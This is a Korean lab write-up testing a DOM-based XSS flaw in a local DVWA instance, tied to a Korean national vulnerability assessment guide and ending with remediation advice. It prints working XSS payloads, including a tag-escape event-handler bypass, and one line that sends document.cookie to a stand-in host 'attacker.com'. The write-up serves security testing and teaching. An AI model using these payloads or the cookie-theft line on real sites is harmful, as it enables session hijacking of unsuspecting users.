# XSS (DOM) 취약점 실습

## 개요

- 본 실습에서는 DVWA의 Low 단계에서 XSS (DOM) 취약점을 대상으로 URL 파라미터 값이 클라이언트 측  
  JavaScript에 의해 DOM에 직접 삽입되는 과정에서 악성 스크립트가 실행되는지 확인하여 XSS 취약점 존재 여부를 점검했습니다.

- 주요정보통신기반시설 기술적 취약점 분석·평가 방법 상세가이드의 XSS 관련 항목(p.711~714)과 연계하여 점검하였습니다.

---

## 주요정보통신기반시설 기준

> 출처 : https://www.kisa.or.kr/2060204/form?postSeq=22&page=1#fnPostAttachDownload ( p.711 ~ 714 )

### 점검 내용

- 웹 애플리케이션 내 악성 스크립트가 다른 사용자의 브라우저에서 실행되는 취약점 존재 여부를 점검합니다.

---

### 점검 목적

- 사용자 입력값에 대한 검증을 실시하여 세션 탈취, 악성 코드 삽입 등 악의적인 스크립트 실행을 차단합니다.

---

### 보안 위협

- 사용자 입력값에 대한 필터링이 없을 경우, 공격자는 사용자 입력값 내  
  악의적인 스크립트(JavaScript, VBScript, ActiveX, Flash 등)를 삽입하여  
  사용자의 쿠키(세션)를 탈취하거나 피싱 사이트로 유도하는 등의 악의적인 공격을 수행할 수 있습니다.
- 크로스사이트 스크립팅은 악의적인 스크립트를 웹 페이지에 삽입하여 사용자 세션 탈취, 키로깅, 피싱 공격 등을  
  유발하는 기법으로, 크게 저장형(Stored)과 반사형(Reflected), DOM 기반 공격 방식으로 나뉩니다.

---

### 판단 기준

#### 양호

- 사용자 입력값에 대해 검증 및 필터링이 이루어져, 악의적인 스크립트가 실행되지 않는 경우

#### 취약

- 사용자 입력값에 대한 검증 및 필터링이 이루어지지 않으며, HTML 코드가 입력 및 실행되는 경우

---

## 점검 절차

1. DVWA XSS (DOM) 페이지 접속 및 정상 동작 확인
2. 기본 스크립트 삽입 및 실행 여부 확인
3. Burp Suite를 통한 요청 패킷 확인
4. 쿠키 탈취 스크립트 삽입 및 실행 여부 확인
5. 태그 이탈을 통한 이벤트 핸들러 우회 확인

---

## 취약점 검증 및 공격 수행

### 실습 화면

- DVWA의 XSS (DOM) 화면이며, 언어를 선택하는 드롭다운 폼이 존재합니다.
- 선택한 언어 값이 `default` 파라미터를 통해 URL에 전달되고,  
  클라이언트 측 JavaScript가 이 값을 읽어 DOM에 직접 삽입하는 구조입니다.

![01](/XSS%20(DOM)/img/01.png)

---

### 정상 동작 확인

- 정상적인 동작 흐름을 확인하기 위해 English를 선택 후 Select 버튼을 클릭했습니다.

![02](/XSS%20(DOM)/img/02.png)

- URL이 아래와 같이 변경됩니다.

```
http://192.168.11.36/DVWA/vulnerabilities/xss_d/?default=English
```

- 선택한 값이 `default` 파라미터로 URL에 그대로 포함되어 전달되는 구조임을 확인했습니다.

---

### 기본 스크립트 삽입 확인

- 클라이언트 측 JavaScript가 `default` 파라미터 값을 검증 없이 DOM에 삽입하는지 확인하기 위해 아래 페이로드를 URL에 직접 삽입했습니다.

```
http://192.168.11.36/DVWA/vulnerabilities/xss_d/?default=<script>alert(1)</script>
```

![03](/XSS%20(DOM)/img/03.png)

- 실행 결과 `1` 값이 담긴 alert 팝업이 실행되는 것을 확인했습니다.
- `default` 파라미터 값이 JavaScript에 의해 DOM에 그대로 삽입되어 스크립트가 실행되고 있습니다.

---

### Burp Suite를 통한 요청 패킷 확인

- 스크립트가 삽입된 URL 요청이 서버로 전달되는지 Burp Suite HTTP history를 통해 확인했습니다.

![04](/XSS%20(DOM)/img/04.png)

```
GET /DVWA/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
Host: 192.168.11.36
Cookie: PHPSESSID=20b946ecaf2e9082fbb1d1e4744a66cf; security=low
```

- DOM XSS임에도 `default` 파라미터가 GET 방식으로 서버에 전달되어 요청이 기록됩니다.
- 단, 서버가 스크립트를 HTML에 삽입하는 것이 아니라 클라이언트 측  
  JavaScript가 URL 파라미터 값을 읽어 DOM에 직접 삽입하는 방식이기 때문에 DOM XSS로 분류됩니다.
- Cookie 헤더에 `PHPSESSID=20b946ecaf2e9082fbb1d1e4744a66cf; security=low` 값이 포함되어 있으며,  
  이 값이 쿠키 탈취 공격의 대상이 됩니다.

![05](/XSS%20(DOM)/img/05.png)

---

### 쿠키 탈취 스크립트 삽입 확인

- 세션 쿠키 탈취 공격이 가능한지 확인하기 위해 아래 페이로드를 삽입했습니다.

```
http://192.168.11.36/DVWA/vulnerabilities/xss_d/?default=<script>alert(document.cookie)</script>
```

![06](/XSS%20(DOM)/img/06.png)

- 실행 결과 현재 세션의 쿠키 정보인  
  `PHPSESSID=20b946ecaf2e9082fbb1d1e4744a66cf; security=low` 값이 alert 팝업으로 출력되는 것을 확인했습니다.
- 실제 공격 환경에서는 `alert` 대신 아래와 같이 공격자 서버로 쿠키를 전송하는 코드를 삽입합니다.

```html
<script>document.location='http://attacker.com:8888/?c='+document.cookie</script>
```

---

### 태그 이탈을 통한 이벤트 핸들러 우회 확인

- `<script>` 태그 외에도 HTML 태그 이탈 후 이벤트 핸들러를 통한 스크립트 실행이 가능한지 확인하기 위해 아래 페이로드를 삽입했습니다.

```
http://192.168.11.36/DVWA/vulnerabilities/xss_d/?default=</option></select><img src=x onerror=alert('XSS')>
```

![07](/XSS%20(DOM)/img/07.png)

- 실행 결과 드롭다운 구조가 깨지면서 `XSS` 문자열이 담긴 alert 팝업이 실행되는 것을 확인했습니다.
- `default` 파라미터 값이 `<select>` 태그 내부에 삽입되는 구조이기 때문에,  
  `</option></select>`로 태그를 강제로 닫은 후 새로운 태그를 삽입하여 `<script>` 없이도 스크립트 실행이 가능합니다.

---

## 취약점 분석

- `default` 파라미터 값이 클라이언트 측 JavaScript에 의해 검증 없이 DOM에 직접 삽입됩니다.
- 소스코드를 보면 URL에서 `default` 파라미터 값을 직접 추출하여 `document.write()`로 DOM에 삽입하는 구조로, 입력값 검증이 전혀 없습니다.

```javascript
if (document.location.href.indexOf("default=") >= 0) {
    var lang = document.location.href.substring(
        document.location.href.indexOf("default=") + 8
    );  // URL에서 default 파라미터 값을 검증 없이 그대로 추출

    document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
    // document.write()로 추출한 값을 HTML로 직접 삽입 — 스크립트 태그가 그대로 실행됨
}
```

- `document.write()`는 입력값을 HTML로 파싱하여 삽입하기 때문에 `<script>` 태그나 이벤트 핸들러가 그대로 실행됩니다.
- `document.cookie`를 이용한 쿠키 탈취 스크립트도 정상 실행되어 `PHPSESSID` 값이 노출되었습니다.
- `</option></select>` 태그 이탈 후 이벤트 핸들러를 통한 우회 공격도 가능한 상태입니다.

**판단 : 취약** — 실제 환경이었다면 세션 탈취, 개인정보 유출, 피싱 공격으로 이어질 수 있습니다.

---

## 대응 방안

### 입력값 검증 및 필터링(HTML 엔티티 변환) 적용

- 크로스사이트 스크립팅 공격에 사용되는 특수문자에 대해 입력값 검증 및 필터링 처리 로직을 서버 사이드에서 구현합니다.

| 변경 전 | 변경 후 |
|---------|---------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `(` | `&#40;` |
| `)` | `&#41;` |
| `#` | `&#35;` |
| `&` | `&amp;` |

#### 핵심 효과

- 스크립트 태그가 HTML 태그로 해석되지 않아 실행이 차단됩니다.

---

### 안전한 DOM 조작 방식 사용

- 클라이언트 측 JavaScript에서 외부 입력값을 DOM에 삽입할 때 반드시 안전한 방식을 사용합니다.

| 취약한 방식 | 안전한 방식 |
|-----------|-----------|
| `innerHTML = 입력값` | `textContent = 입력값` |
| `document.write(입력값)` | DOM API로 요소 생성 후 삽입 |
| `eval(입력값)` | 사용 자체를 지양 |

```javascript
// document.write() 대신 textContent로 안전하게 삽입 — HTML로 파싱되지 않아 스크립트 실행 불가
var option = document.createElement("option");
option.textContent = decodeURI(lang);
option.value = lang;
document.querySelector("select").appendChild(option);
```

#### 핵심 효과

- 입력값이 HTML로 파싱되지 않아 스크립트 삽입 자체를 차단합니다.

---

### 화이트리스트 방식 HTML 코드 처리

- 부득이하게 HTML 코드를 사용해야 하는 경우 화이트리스트 방식을 적용하여 허용된 HTML 코드만 처리합니다.

#### 핵심 효과

- 허용되지 않은 태그 및 스크립트 삽입 시도를 사전에 차단합니다.

---

### 웹 방화벽(WAF) 필터링 룰셋 적용

- 웹 방화벽에서 웹 태그 및 스크립트 관련 특수문자 필터링 룰셋을 적용하여 추가적인 방어를 확보합니다.

#### 핵심 효과

- 서버 사이드 필터링이 우회되더라도 추가 방어선을 통해 공격을 차단합니다.

---

### 쿠키 보안 옵션 설정

- 세션 탈취 방지를 위해 쿠키에 `HttpOnly`, `Secure`, `SameSite` 옵션을 설정하여 쿠키가 외부에 노출되지 않도록 보호합니다.

#### 핵심 효과

- XSS 취약점이 존재하더라도 쿠키 탈취를 통한 세션 하이재킹을 방지할 수 있습니다.
